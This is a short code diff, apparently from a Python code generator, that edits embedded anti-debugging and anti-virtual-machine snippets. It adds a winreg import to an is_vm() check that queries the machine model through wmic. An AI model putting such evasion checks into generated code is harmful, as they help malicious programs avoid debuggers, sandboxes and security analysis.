@@ -383,7 +383,9 @@ if is_debugger_present():
     os._exit(0)
 
 """
-    anti_vm_code = """def is_vm():
+    anti_vm_code = """import winreg
+
+def is_vm():
     try:
         output = subprocess.check_output(
             ['wmic', 'computersystem', 'get', 'model'],
